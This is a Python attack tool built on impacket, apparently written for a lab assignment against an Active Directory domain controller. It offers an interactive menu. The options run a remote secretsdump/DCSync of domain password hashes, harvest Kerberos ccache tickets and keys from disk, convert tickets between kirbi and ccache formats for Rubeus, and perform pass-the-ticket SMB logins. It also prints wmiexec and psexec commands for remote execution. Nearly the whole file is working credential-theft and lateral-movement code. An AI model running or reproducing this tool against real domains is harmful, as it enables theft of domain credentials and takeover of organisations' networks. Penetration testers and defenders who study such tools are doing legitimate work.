#!/usr/bin/env python3
"""
intercept_kerberos_tickets.py — Kerberos Ticket Harvesting
Assigned to: Seif
"""

import argparse
import sys
import os
import glob
import getpass
from datetime import datetime, timezone
from binascii import hexlify

try:
    from impacket.krb5.ccache import CCache
    from impacket.krb5.asn1 import TGS_REP, AS_REP
    from impacket.krb5 import constants
    from impacket.krb5.types import Principal, KerberosTime
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
    from impacket.smbconnection import SMBConnection
    from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
    from pyasn1.codec.ber import decoder, encoder
except ImportError as e:
    print(f"[!] Missing dependency: {e}")
    sys.exit(1)

R  = "\033[91m"
G  = "\033[92m"
Y  = "\033[93m"
B  = "\033[94m"
C  = "\033[96m"
W  = "\033[97m"
M  = "\033[95m"
BO = "\033[1m"
RS = "\033[0m"

# ─────────────────────────────────────────────────────────────────────────────
# INTERACTIVE CONFIG — asks IP, domain, creds at startup
# ─────────────────────────────────────────────────────────────────────────────
def get_config():
    print(f"\n{M}{BO}╔══════════════════════════════════════════════════════╗")
    print(f"║   K E R B E R O S   T I C K E T   H A R V E S T    ║")
    print(f"║   Dump | Parse | Convert | Pass-the-Ticket          ║")
    print(f"╚══════════════════════════════════════════════════════╝{RS}")

    print(f"\n{C}{BO}[ Lab Configuration ]{RS}")
    print(f"  {Y}Press Enter to use default value shown in [ ]{RS}\n")

    dc_ip = input(f"  {W}DC IP      {C}[192.168.1.48]{W}: {RS}").strip()
    if not dc_ip:
        dc_ip = "192.168.1.48"

    domain = input(f"  {W}Domain     {C}[cs.org]{W}:       {RS}").strip()
    if not domain:
        domain = "cs.org"

    print(f"\n  {G}[+] Using: {dc_ip} | {domain}{RS}\n")
    return dc_ip, domain


def get_creds():
    print(f"\n{C}{BO}[ Credentials ]{RS}")

    username = input(f"  {W}Username {C}[Administrator]{W}: {RS}").strip()
    if not username:
        username = "Administrator"

    print(f"\n  {W}Auth method:{RS}")
    print(f"    {C}[1]{W} Password{RS}")
    print(f"    {C}[2]{W} NT Hash{RS}")
    ch = input(f"\n  Choice {C}[1]{W}: {RS}").strip() or "1"

    password = ""
    nt_hash  = ""
    if ch == "2":
        nt_hash = input(f"  {W}NT Hash: {RS}").strip()
    else:
        password = getpass.getpass(f"  {W}Password: {RS}")

    return username, password, nt_hash


# ─────────────────────────────────────────────────────────────────────────────
# MENU
# ─────────────────────────────────────────────────────────────────────────────
def show_menu():
    print(f"\n  {C}┌─────────────────────────────────────────────────┐")
    print(f"  │              SELECT TECHNIQUE                   │")
    print(f"  ├─────────────────────────────────────────────────┤")
    print(f"  │  {W}[1] dump     — Remote hash dump via DCE/RPC    {C}  │")
    print(f"  │  {W}[2] ccache   — Parse .ccache files on disk     {C}  │")
    print(f"  │  {W}[3] convert  — Convert .kirbi ↔ .ccache        {C}  │")
    print(f"  │  {W}[4] ptt      — Pass-the-Ticket                 {C}  │")
    print(f"  │  {W}[5] request  — Request fresh TGT/TGS           {C}  │")
    print(f"  │  {W}[0] exit                                       {C}  │")
    print(f"  └─────────────────────────────────────────────────┘{RS}")
    return input(f"\n  {W}❯ {RS}").strip()


# ─────────────────────────────────────────────────────────────────────────────
# TECHNIQUE 1 — Remote dump
# ─────────────────────────────────────────────────────────────────────────────
def technique_remote_dump(target, domain, username, password, nt_hash):
    print(f"\n{C}{BO}[ TECHNIQUE 1: Remote secretsdump ]{RS}")
    print(f"  {Y}Flow: SMB auth → DRSUAPI/SAMR/WINREG → hash extraction{RS}\n")

    lm_hash = "aad3b435b51404eeaad3b435b51404ee" if nt_hash else ""

    print(f"  {B}[*] Connecting to {target} via SMB...{RS}")
    try:
        smb_conn = SMBConnection(target, target, sess_port=445, timeout=10)
        smb_conn.login(username, password, domain, lm_hash, nt_hash)
        print(f"  {G}  [+] SMB authenticated as {username}@{domain}{RS}")
    except Exception as e:
        print(f"  {R}  [!] SMB auth failed: {e}{RS}")
        return

    print(f"\n  {B}[*] Setting up remote operations...{RS}")
    try:
        remote_ops = RemoteOperations(smb_conn, False)
        remote_ops.enableRegistry()
        print(f"  {G}  [+] Remote registry enabled{RS}")
    except Exception as e:
        print(f"  {R}  [!] RemoteOperations failed: {e}{RS}")
        smb_conn.close()
        return

    try:
        boot_key = remote_ops.getBootKey()
        print(f"  {G}  [+] Boot key: {hexlify(boot_key).decode()}{RS}")
    except Exception as e:
        print(f"  {Y}  [~] SAM: {e}{RS}")
        boot_key = None

    print(f"\n  {B}[*] Attempting DCSync (DRSUAPI)...{RS}")
    try:
        ntds = NTDSHashes(
            None, boot_key,
            isRemote=True, history=False, noLMHash=True,
            remoteOps=remote_ops, useVSSMethod=False,
            justNTLM=False, pwdLastSet=False,
            resumeSession=None, outputFileName=None,
            justUser=None, printUserStatus=False
        )

        print(f"\n  {G}{BO}[ DOMAIN HASHES ]{RS}")
        print(f"  {'─'*60}")

        def hash_cb(secret):
            print(f"  {W}{secret}{RS}")
            if any(x in str(secret).lower() for x in ['administrator', 'krbtgt']):
                print(f"  {R}{BO}  ↑ HIGH VALUE!{RS}")

        ntds.dump()
        ntds.finish()

    except Exception as e:
        print(f"  {Y}  [~] DCSync not available: {e}{RS}")

    try:
        remote_ops.finish()
    except:
        pass
    smb_conn.close()


# ─────────────────────────────────────────────────────────────────────────────
# TECHNIQUE 2 — Parse .ccache
# ─────────────────────────────────────────────────────────────────────────────
def technique_parse_ccache(domain):
    print(f"\n{C}{BO}[ TECHNIQUE 2: Parse .ccache Files ]{RS}")

    print(f"\n  {W}Scan dir or single file? {C}[1=dir / 2=file]{W}: {RS}", end="")
    ch = input().strip()

    if ch == "2":
        ccache_file = input(f"  {W}File path: {RS}").strip()
        files = [ccache_file] if os.path.exists(ccache_file) else []
    else:
        ccache_dir = input(f"  {W}Directory to scan {C}[/tmp]{W}: {RS}").strip() or "/tmp"
        patterns = [
            os.path.join(ccache_dir, "krb5cc_*"),
            os.path.join(ccache_dir, "*.ccache"),
        ]
        files = []
        for pat in patterns:
            files.extend(glob.glob(pat))
        env_cache = os.environ.get('KRB5CCNAME', '')
        if env_cache and env_cache not in files and os.path.exists(env_cache):
            files.append(env_cache)

    if not files:
        print(f"  {Y}[~] No .ccache files found{RS}")
        print(f"  {Y}    Generate one first with option [5] Request TGT{RS}")
        return

    print(f"\n  {G}[+] Found {len(files)} ccache file(s){RS}\n")
    all_tickets = []

    for filepath in files:
        print(f"  {W}{BO}[ {filepath} ]{RS}")
        try:
            cc = CCache.loadFile(filepath)
        except Exception as e:
            print(f"  {R}  [!] Could not parse: {e}{RS}\n")
            continue

        try:
            print(f"  {C}  Owner: {cc.principal.prettyPrint()}{RS}")
        except:
            print(f"  {C}  Owner: (unknown){RS}")

        print(f"  {'─'*55}")
        print(f"  {'SERVICE':<40} {'EXPIRES':<20} TYPE")
        print(f"  {'─'*55}")

        for cred in cc.credentials:
            try:
                server = cred['server'].prettyPrint()
                try:
                    endtime = KerberosTime.fromASN1(cred['time']['endtime'])
                    now     = datetime.now(timezone.utc)
                    expired = endtime < now
                    exp_str = endtime.strftime("%Y-%m-%d %H:%M")
                    exp_col = R if expired else G
                    exp_tag = " [EXPIRED]" if expired else ""
                except:
                    exp_str, exp_col, exp_tag = "unknown", Y, ""

                is_tgt = 'krbtgt' in server.lower()
                ttype  = f"{Y}TGT{RS}" if is_tgt else f"{B}TGS{RS}"

                print(f"  {W}{server:<40}{RS} {exp_col}{exp_str}{exp_tag}{RS:<10} {ttype}")

                try:
                    keytype    = int(cred['key']['keytype'])
                    keydata    = bytes(cred['key']['keyvalue'])
                    etype_name = {17:"AES128",18:"AES256",23:"RC4-HMAC"}.get(keytype, f"etype-{keytype}")
                    print(f"    {C}Key: {etype_name} | {hexlify(keydata).decode()[:32]}...{RS}")
                except:
                    pass

                all_tickets.append({'file': filepath, 'server': server, 'is_tgt': is_tgt})
            except Exception as e:
                print(f"  {R}  Error: {e}{RS}")
        print()

    tgts = [t for t in all_tickets if t['is_tgt']]
    print(f"  {G}{BO}Summary: {len(tgts)} TGT(s) | {len(all_tickets)-len(tgts)} TGS(s){RS}")

    if tgts:
        dc_fqdn = f"CS-DC01.{domain}"
        print(f"\n  {C}Use a TGT:{RS}")
        for t in tgts[:2]:
            print(f"  {W}  export KRB5CCNAME={t['file']}{RS}")
            print(f"  {W}  python3 wmiexec.py -k -no-pass {domain}/Administrator@{dc_fqdn}{RS}")


# ─────────────────────────────────────────────────────────────────────────────
# TECHNIQUE 3 — Convert .kirbi <-> .ccache
# ─────────────────────────────────────────────────────────────────────────────
def technique_convert():
    print(f"\n{C}{BO}[ TECHNIQUE 3: Ticket Format Conversion ]{RS}")
    print(f"  {Y}  .kirbi = Windows (Mimikatz/Rubeus){RS}")
    print(f"  {Y}  .ccache = Linux (impacket){RS}\n")

    input_file  = input(f"  {W}Input file  (.kirbi or .ccache): {RS}").strip()
    output_file = input(f"  {W}Output file (.ccache or .kirbi): {RS}").strip()

    if not os.path.exists(input_file):
        print(f"  {R}[!] File not found: {input_file}{RS}")
        return

    ext_in  = input_file.lower().split('.')[-1]
    ext_out = output_file.lower().split('.')[-1]

    if ext_in in ('kirbi', 'bin') and ext_out == 'ccache':
        try:
            with open(input_file, 'rb') as f:
                data = f.read()
            try:
                import base64
                data = base64.b64decode(data)
                print(f"  {Y}  (base64 decoded){RS}")
            except:
                pass
            cc = CCache()
            cc.fromKirbi(data)
            cc.saveFile(output_file)
            print(f"  {G}[+] Saved: {output_file}{RS}")
            print(f"  {W}  export KRB5CCNAME={output_file}{RS}")
        except Exception as e:
            print(f"  {R}[!] Failed: {e}{RS}")

    elif ext_in == 'ccache' and ext_out in ('kirbi', 'bin'):
        try:
            import base64
            cc    = CCache.loadFile(input_file)
            kirbi = cc.toKirbi()
            with open(output_file, 'wb') as f:
                f.write(kirbi)
            b64 = base64.b64encode(kirbi).decode()
            print(f"  {G}[+] Saved: {output_file}{RS}")
            print(f"  {C}Base64 for Rubeus:{RS}")
            print(f"  {Y}  {b64[:80]}...{RS}")
        except Exception as e:
            print(f"  {R}[!] Failed: {e}{RS}")
    else:
        print(f"  {R}[!] Unsupported: {ext_in} → {ext_out}{RS}")
        print(f"      Use: .kirbi → .ccache  or  .ccache → .kirbi")


# ─────────────────────────────────────────────────────────────────────────────
# TECHNIQUE 4 — Pass-the-Ticket
# ─────────────────────────────────────────────────────────────────────────────
def technique_ptt(target, domain):
    print(f"\n{C}{BO}[ TECHNIQUE 4: Pass-the-Ticket ]{RS}")

    ccache_file = input(f"  {W}.ccache file path: {RS}").strip()
    username    = input(f"  {W}Username {C}[Administrator]{W}: {RS}").strip() or "Administrator"

    if not os.path.exists(ccache_file):
        print(f"  {R}[!] File not found: {ccache_file}{RS}")
        return

    print(f"\n  {B}[*] Inspecting ticket...{RS}")
    try:
        cc = CCache.loadFile(ccache_file)
        for cred in cc.credentials:
            try:
                print(f"  {G}  ✓ {cred['server'].prettyPrint()}{RS}")
            except:
                pass
    except Exception as e:
        print(f"  {R}[!] Failed to read: {e}{RS}")
        return

    os.environ['KRB5CCNAME'] = ccache_file
    print(f"\n  {G}[+] KRB5CCNAME set → {ccache_file}{RS}")

    print(f"\n  {B}[*] Testing SMB with ticket...{RS}")
    try:
        smb_conn = SMBConnection(target, target, sess_port=445, timeout=10)
        smb_conn.kerberosLogin(username, "", domain, "", "", "", kdcHost=target)
        print(f"  {G}[+] SMB authenticated via Kerberos!{RS}")
        shares = smb_conn.listShares()
        for s in shares:
            print(f"    {W}  {s['shi1_netname'][:-1]}{RS}")
        smb_conn.close()
    except Exception as e:
        print(f"  {R}[!] SMB failed: {e}{RS}")
        print(f"  {Y}    Use FQDN not IP for Kerberos auth{RS}")

    dc_fqdn = f"CS-DC01.{domain}"
    print(f"\n  {C}Commands to use this ticket:{RS}")
    print(f"  {W}  export KRB5CCNAME={ccache_file}{RS}")
    print(f"  {W}  python3 wmiexec.py   -k -no-pass {domain}/{username}@{dc_fqdn}{RS}")
    print(f"  {W}  python3 smbclient.py -k -no-pass {domain}/{username}@{dc_fqdn}{RS}")
    print(f"  {W}  python3 psexec.py    -k -no-pass {domain}/{username}@{dc_fqdn}{RS}")


# ─────────────────────────────────────────────────────────────────────────────
# TECHNIQUE 5 — Request fresh TGT/TGS
# ─────────────────────────────────────────────────────────────────────────────
def technique_request(target, domain):
    print(f"\n{C}{BO}[ TECHNIQUE 5: Request Fresh Ticket ]{RS}")

    username, password, nt_hash = get_creds()
    spn = input(f"  {W}Target SPN (optional, press Enter to skip): {RS}").strip()

    lm_hash        = "aad3b435b51404eeaad3b435b51404ee" if nt_hash else ""
    user_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

    print(f"\n  {B}[*] Requesting TGT for {username}@{domain.upper()}...{RS}")
    try:
        if nt_hash:
            tgt, cipher, old_sk, sk = getKerberosTGT(
                clientName=user_principal, password="", domain=domain,
                lmhash=bytes.fromhex(lm_hash), nthash=bytes.fromhex(nt_hash),
                aesKey="", kdcHost=target
            )
        else:
            tgt, cipher, old_sk, sk = getKerberosTGT(
                clientName=user_principal, password=password, domain=domain,
                lmhash=b"", nthash=b"", aesKey="", kdcHost=target
            )
        print(f"  {G}  [+] TGT obtained!{RS}")
    except Exception as e:
        print(f"  {R}  [!] TGT failed: {e}{RS}")
        return

    outfile = f"{username}_tgt.ccache"
    cc = CCache()
    cc.fromTGT(tgt, old_sk, sk)
    cc.saveFile(outfile)
    print(f"  {G}  [+] Saved: {outfile}{RS}")

    if spn:
        print(f"\n  {B}[*] Requesting TGS for {spn}...{RS}")
        try:
            server     = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
            tgs, c2, o2, s2 = getKerberosTGS(
                serverName=server, domain=domain, kdcHost=target,
                tgt=tgt, cipher=cipher, sessionKey=sk
            )
            tgs_file = f"{username}_{spn.replace('/','_')}.ccache"
            cc2 = CCache()
            cc2.fromTGS(tgs, o2, s2)
            cc2.saveFile(tgs_file)
            print(f"  {G}  [+] TGS saved: {tgs_file}{RS}")
        except Exception as e:
            print(f"  {R}  [!] TGS failed: {e}{RS}")

    print(f"\n  {C}Use it:{RS}")
    print(f"  {W}  export KRB5CCNAME={outfile}{RS}")


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
def main():
    dc_ip, domain = get_config()

    while True:
        choice = show_menu()

        if choice == "0":
            print(f"\n  {Y}Bye!{RS}\n")
            break

        elif choice == "1":
            username, password, nt_hash = get_creds()
            technique_remote_dump(dc_ip, domain, username, password, nt_hash)

        elif choice == "2":
            technique_parse_ccache(domain)

        elif choice == "3":
            technique_convert()

        elif choice == "4":
            technique_ptt(dc_ip, domain)

        elif choice == "5":
            technique_request(dc_ip, domain)

        else:
            print(f"  {R}Invalid choice{RS}")

        input(f"\n  {Y}Press Enter to return to menu...{RS}")


if __name__ == "__main__":
    main()